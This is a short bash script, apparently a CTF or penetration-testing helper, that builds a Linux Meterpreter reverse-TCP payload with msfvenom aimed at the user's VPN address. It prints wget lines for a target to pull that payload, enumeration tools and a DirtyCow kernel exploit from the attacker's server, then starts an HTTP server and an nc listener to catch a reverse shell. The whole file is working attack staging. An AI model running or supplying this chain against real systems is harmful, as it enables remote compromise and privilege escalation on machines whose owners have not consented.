#!/bin/bash
# coding:UTF-8

# -------------------------------------------------------------------------------------
#                            LINUX HTTP SERVER MANAGER
#                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
# -------------------------------------------------------------------------------------

ifconfig tun0 | grep 'inet ' | awk '{print $2}' | sed 's/addr://' > file.txt
filename="file.txt"

while read line
  do
  msfvenom -p linux/x86/meterpreter/reverse_tcp  LHOST=$line LPORT=6666 -f exe -o linpayload.elf
done < $filename

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Display my universal banner.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

clear

echo "\t\t _     ___ _   _ _   ___  __  _   _ _____ _____ ____    ____  _____ ______     _______ ____   "
echo "\t\t| |   |_ _| \ | | | | \ \/ / | | | |_   _|_   _|  _ \  / ___|| ____|  _ \ \   / / ____|  _ \  "
echo "\t\t| |    | ||  \| | | | |\  /  | |_| | | |   | | | |_) | \___ \|  _| | |_) \ \ / /|  _| | |_) | "
echo "\t\t| |___ | || |\  | |_| |/  \  |  _  | | |   | | |  __/   ___) | |___|  _ < \ V / | |___|  _ <  "
echo "\t\t|_____|___|_| \_|\___//_/\_\ |_| |_| |_|   |_| |_|     |____/|_____|_| \_\ \_/  |_____|_| \_\ "
echo "\t\t                                                                                              "
echo "\t\t                   BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                      "
echo "\n"

echo "Startup Instructions:"
echo "\n"
echo "If required:"
echo "wget \"http://$line:8000/linpayload.elf\"\n\nOtherwise:"

while read line
  do
  echo "wget \"http://$line:8000/SH/LinEnum.sh\""
  echo "wget \"http://$line:8000/SH/LinEnumPlus.sh\""
  echo "wget \"http://$line:8000/SH/LinPe.sh\""
  echo "wget \"http://$line:8000/ELF/pspy32\""
  echo "wget \"http://$line:8000/ELF/pspy64\""
  
  echo "\nKernel Exploits:"
  echo "wget \"http://$line:8000/KERNALS/NaughtyCowCompile.sh\""
  echo "wget \"http://$line:8000/KERNALS/NaughthyCow.c\""
done < $filename

echo ""
exec python -m SimpleHTTPServer > output.txt &
rlwrap nc -lvnp 9001

#End
